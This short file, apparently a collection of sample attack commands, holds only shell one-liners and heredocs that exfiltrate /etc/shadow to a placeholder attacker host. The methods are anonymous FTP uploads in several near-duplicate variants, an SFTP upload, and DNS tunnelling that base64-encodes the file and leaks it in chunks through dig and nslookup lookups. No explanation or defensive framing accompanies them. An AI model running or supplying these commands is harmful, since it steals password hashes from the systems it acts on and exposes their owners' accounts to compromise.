command:
printf 'user anonymous anon
put /etc/shadow /tmp/shadow_exfil
bye
' | ftp -inv attacker.example.com

ftp -inv attacker.example.com <<'EOF'
user anonymous anonymous
binary
put /etc/shadow shadow_exfil_ftp
bye
EOF

sftp attacker@example.com:/tmp <<'EOF'
put /etc/shadow shadow_exfil_sftp
bye
EOF

ftp -inv attacker.example.com <<'EOF'
user anonymous anonymous
put /etc/shadow shadow_exfil_ftp
bye
EOF
for c in $(base64 -w0 /etc/shadow | fold -w 50); do dig +short ${c}.attacker.example.com; done

ftp -n attacker.example.com <<'EOF'
user anonymous anonymous
put /etc/shadow shadow_exfil_ftp
quit
EOF
base64 -w0 /etc/shadow | fold -w32 | while read -r chunk; do nslookup ${chunk}.attacker.example.com; done
